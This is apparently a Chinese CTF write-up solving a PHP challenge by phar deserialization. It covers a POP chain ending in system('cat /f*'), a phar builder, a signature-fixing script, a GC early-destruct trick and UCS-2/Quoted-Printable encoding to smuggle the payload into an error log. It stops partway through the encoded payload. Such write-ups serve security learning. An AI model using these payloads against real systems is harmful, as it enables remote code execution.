<p>弄了半天，扫了目录发现源码都在www.zip上。。。</p>
<p>Myerror.class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'error_log'</span>,<span class="hljs-string">'/var/www/html/log/error.txt'</span>);
            <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'log_errors'</span>,<span class="hljs-number">1</span>);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;{<span class="hljs-variable language_">$this</span>-&gt;test};
            <span class="hljs-keyword">return</span> <span class="hljs-string">"test"</span>;
        }
    }</code></pre>
<p>User.class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">include</span>(<span class="hljs-string">"view/login.html"</span>);
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])){
                <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>];
                <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];
                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>()){
                    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"location:./?c=Files&amp;m=read"</span>);
                }
            }
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">"admin"</span>){
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">echo</span> <span class="hljs-string">"<span class="hljs-subst">{$this-&gt;username}</span>的密码不正确或不存在该用户"</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
            (@<span class="hljs-variable language_">$this</span>-&gt;password)();
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>{ 
            (<span class="hljs-variable">$name</span>)();
        }
    }</code></pre>
<p>Files.class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">include</span>(<span class="hljs-string">"view/file.html"</span>);
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>])){
                <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>];
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"请输入文件名"</span>);
            }
            <span class="hljs-variable">$contents</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br&gt;&lt;textarea class="file_content" type="text" value='</span>.<span class="hljs-string">"&lt;br&gt;"</span>.<span class="hljs-variable">$contents</span>;
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i'</span>,<span class="hljs-variable">$this</span>-&gt;filename)){
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"这合理吗"</span>;
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"这不合理"</span>);
            }
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'write'</span>])){
                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$contents</span>);
            }
            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>)){
                <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"该文件不存在或者内容为空"</span>);
            } 
        }

         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
            (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);
        }
    }</code></pre>
<p>除了File这个类文件，上述几个就是来处理错误和用户登录的</p>
<p><code>UserClass.__destruct-》UserClass.check-》MyerrorClass.__toString-》FilesClass.__get</code></p>
<p>这里我先直接写出最终的链子</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);
    }
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$pop1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$pop</span>-&gt;password = [<span class="hljs-variable">$pop1</span>, <span class="hljs-string">'check'</span>];
<span class="hljs-variable">$pop</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();
<span class="hljs-variable">$pop</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();
<span class="hljs-variable">$pop</span>-&gt;username-&gt;test = <span class="hljs-string">'system'</span>;
<span class="hljs-variable">$pop</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">'ls /'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>不过这个链子在调用check方法的时候会遇到点问题：</p>
<pre><code class="hljs scss">在PHP中，当你在类的 __destruct 魔术方法中使用 <span class="hljs-built_in">check</span>() 的方式进行调用时，它与 <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">check</span>() 的调用方式并不相同。

<span class="hljs-built_in">check</span>() 的方式是以函数的方式进行调用，而不是作为类的方法进行调用。这意味着它将被视为全局函数，而不是类的方法。这种方式可能会导致错误，因为在 __destruct 方法中无法直接调用全局函数。

如果你想在 __destruct 方法中调用类的方法，正确的方式是使用 <span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">check</span>()。这将确保在类的上下文中调用 <span class="hljs-built_in">check</span>() 方法。</code></pre>
<p>也就是说下面这个代码，如果我们直接将password赋值为check的话，就是这样的：check()，而这种调用方式与$this-&gt;check()是不相同的。那我们想要调用check函数，这里就需要利用PHP某个特性了</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
            (@<span class="hljs-variable language_">$this</span>-&gt;password)();
        }</code></pre>
<p>解决办法就是利用PHP7引入的一个新特性 Uniform Variable Syntax,它扩展了可调用数组的功能,增加了其在变量上<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">调用函数</a>的能力，使得可以在一个变量（或表达式）后面加上括号直接调用函数。<br>
可调用数组的构造我们简单测试下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;check!!!"</span>;
    }
}

<span class="hljs-variable">$a</span>=[<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(),<span class="hljs-string">"check"</span>];
<span class="hljs-variable">$a</span>();</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314200523714.png" alt="image-20240314200523714"></p>
<p>后面基本就不会了，都是没见过的知识，首先这里我们先理一下思路，这里我们链子准备好了，就是要找反序列化的点，很明显没有unserialize，但是有file_get_contents，同时还有查看文件的功能。那很容易联想到phar反序列化，那我们看看假设我们可以上传链子了，会遇到什么问题</p>
<p>那我们上传了链子，肯定需要phar伪协议去读取相应的文件，但我们需要看一下代码执行逻辑，这里上传之后会调用到getFile函数，该函数含有filter会将我们的phar等关键字过滤掉，闹我们就得想办法绕过。</p>
<p>同时注意到filter的过滤函数是在file_get_contents反序列化入口点的后面，这充分暗示我们可以绕过，同时注意到User类中含有析构函数，这里就可以联想到PHP的GC垃圾回收机制，如果我们可以提前调用到析构函数，那就会完全按照我们理想的链子路线走下去，就不会被filter所过滤掉。至于如何提前调用已经学过很多次了，就不赘述了，放几篇好的文章参考即可。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314202405761.png" alt="image-20240314202405761"></p>
<pre><code class="hljs scss">O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Myerror"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"message"</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Files"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"filename"</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">"arg"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"ls /"</span>;}s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;}s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:{<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;N;}<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"check"</span>;}}</code></pre>
<p>我们的链子输出如下，我们可以通过修改对象指针索引来提前调用到析构函数，也就是改为下面的（i:0）</p>
<pre><code class="hljs scss">O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Myerror"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"message"</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Files"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"filename"</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">"arg"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"ls /"</span>;}s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;}s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:{<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"User"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;N;}<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"check"</span>;}}</code></pre>
<p>但是我们生成的phar文件，因此在经过010修改后还需要重新计算签名，完整pop如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);
    }
}
<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$pop1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$pop</span>-&gt;password = [<span class="hljs-variable">$pop1</span>, <span class="hljs-string">'check'</span>];
<span class="hljs-variable">$pop</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();
<span class="hljs-variable">$pop</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();
<span class="hljs-variable">$pop</span>-&gt;username-&gt;test = <span class="hljs-string">'system'</span>;
<span class="hljs-variable">$pop</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">'cat /f*'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$pop</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314203310329.png" alt="image-20240314203310329"></p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse
<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'D:\\PphProject\\Scripts\\exp.phar'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> file:
    f = file.read()
s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span>
h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span>
newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'newtest.phar'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> file:
    file.write(newf) <span class="hljs-comment"># 写入新文件</span></code></pre>
<p>然后就是如何利用伪协议和过滤器读取，因为phar文件含有特殊字符，直接将二进制复制上去根本识别不了，因此会想到用base64编码复制上去。但当我们简单测试一下会发现，如果先发送base64编码内容，接着利用PHP伪协议对内容进行解码会发现这样的报错</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314204944475.png" alt="image-20240314204944475"></p>
<p>至于为何我们是要读取error.txt，完全就是因为当我们输入一些不符合代码的内容，该内容就会被传入error.txt（测试一下就知道了）</p>
<p>上述的报错是因为读取的是整个error.txt文件，其中包括了其他非编码信息,而Base64会将所有数字，字母/+=都认为是需要解码的，而那些其他垃圾数据没有经过base64编码，直接解码肯定会报错。因此靠这个思路，我们会想到怎样才能将除了我们payload之外的内容都搞成乱码（base64识别不了的）这样解码的时候，就会只解码我们的payload而不会报错。</p>
<p>这里就需要新知识了</p>
<h2 id="utf-16le编码">utf-16le编码</h2>
<blockquote>
<p>当utf-8转换为utf-16le时，每一位字符后面都会加上一个\0，这个\0是不可见的，当将utf-16le转换为utf-8的时候，只有后面有\0的才会被正常转换，否则变为乱码</p>
</blockquote>
<p>那么我们是否可以利用utf-16le来标记我们的payload，然后解码只对我们payload解码(其他变成乱码)，然后再base64解码。不过这个被过滤了，我们可以用UCS-2编码（区别在于\0在前面）</p>
<h2 id="ucs-2编码">UCS-2编码</h2>
<blockquote>
<p>UCS-2 编码使用固定2个字节,所以在ASCII字符中,在每个字符前面会填充一个 00字节(大端序)</p>
</blockquote>
<pre><code class="hljs scss">lanb0
=&gt;
\x00l\x00a\x00n\x00b\x000</code></pre>
<p>那么下一步就是如何构造<code>\0</code>，因为是不可见字符，所以引入Quoted-Printable编码</p>
<blockquote>
<p>“Quoted-Printable"编码的基本原则是：安全的ASCII字符（如字母、数字、标点符号等）保持不变，空格也保持不变（但行尾的空格必须编码），其他所有字符（如非ASCII字符或控制字符）则以”="后跟两个十六进制数字的形式编码</p>
</blockquote>
<pre><code class="hljs scss">lanb0\n
=&gt;
lanb0=<span class="hljs-number">0</span>A</code></pre>
<p>这样的话，整个流程如下：</p>
<pre><code class="hljs scss">测试数据：test
base64编码：dGVzdA==
加上\<span class="hljs-number">0</span>（等号也要转换）：=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D

上传后：
垃圾数据=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D垃圾数据
解码：
垃圾数据\<span class="hljs-number">0</span>d \<span class="hljs-number">0</span>G \<span class="hljs-number">0</span>V \<span class="hljs-number">0</span>z \<span class="hljs-number">0</span>d \<span class="hljs-number">0</span>A \<span class="hljs-number">0</span>= \<span class="hljs-number">0</span>=垃圾数据
UCS-<span class="hljs-number">2</span>转UTF-<span class="hljs-number">8</span>：乱码dGVzdA==乱码
base64解码：test</code></pre>
<p>加密脚本</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'newtest.phar'</span>);<span class="hljs-comment">//获取二进制数据</span>
<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">'utf-8'</span>,<span class="hljs-string">'UCS-2'</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//UCS-2编码</span>
<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'hacker.txt'</span>,<span class="hljs-title function_ invoke__">quoted_printable_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//quoted_printable编码</span>
<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'hacker.txt'</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/=\r\n/'</span>,<span class="hljs-string">''</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'hacker.txt'</span>)).<span class="hljs-string">'=00=3D'</span>);<span class="hljs-comment">//解决软换行导致的编码结构破坏</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<blockquote>
<p>注：在 Quoted-Printable 编码中，为了防止编码后的字符串过长，通常会在每76个字符后插入一个软换行，也就是 = 符号加上一个换行符。</p>
</blockquote>
<pre><code class="hljs scss">=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>D=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>X=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>V=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>K=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>k=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>D=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>D=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>A=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span 